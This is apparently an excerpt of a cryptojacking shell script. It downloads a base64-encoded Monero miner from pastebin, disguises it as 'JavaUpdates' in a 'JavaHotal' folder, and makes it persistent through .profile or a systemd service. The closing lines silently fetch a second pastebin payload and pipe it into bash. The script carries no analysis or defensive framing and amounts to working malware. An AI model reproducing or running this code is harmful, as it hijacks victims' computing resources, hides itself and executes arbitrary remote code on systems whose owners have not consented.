...
function gettarfile() {
	...
	mkdir -p $HOME/JavaHotal/
	cd $temp_path
	(curl -fsSL https://pastebin.com/raw/GMdeWqec -o $tar_out||wget -q https://pastebin.com/raw/GMdeWqec -O $tar_out)
	base64 -d $tar_out >$HOME/JavaHotal/JavaUpdates
	chmod 777 $HOME/JavaHotal/JavaUpdates
	rm -rf $temp_path
}
...
cat >$HOME/JavaHotal/miner.sh <<EOL
#!/bin/bash
if ! pidof JavaUpdates >/dev/null; then
  nice $HOME/JavaHotal/JavaUpdates \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall JavaUpdates\" or \"sudo killall JavaUpdates\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/JavaHotal/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep JavaHotal/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/JavaHotal/miner.sh script to $HOME/.profile"
    echo "$HOME/JavaHotal/miner.sh >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/JavaHotal/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/JavaHotal/JavaUpdates.log file)"
  /bin/bash $HOME/JavaHotal/miner.sh >/dev/null 2>&1
else
  if ! type systemctl >/dev/null; then
    ...
    echo "[*] Creating JavaHotal_miner systemd service"
    cat >/tmp/JavaHotal_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/JavaHotal/JavaUpdates
Restart=always
Nice=10
CPUWeight=1
...
EOL
    sudo mv /tmp/JavaHotal_miner.service /etc/systemd/system/JavaHotal_miner.service
    echo "[*] Starting JavaHotal_miner systemd service"
    sudo killall JavaUpdates 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable JavaHotal_miner.service
    sudo systemctl start JavaHotal_miner.service
    echo "To see miner service logs run \"sudo journalctl -u JavaHotal_miner -f\" command"
  fi
fi

		px=$(ps -fe|grep 'JavaUpdates'|grep -v grep|wc -l)
		if [ ${px} -eq 0 ];then
		(curl -fsSL https://pastebin.com/raw/UhUmR517||wget -q -O - https://pastebin.com/raw/UhUmR517)|base64 -d|bash &>/dev/null &
		fi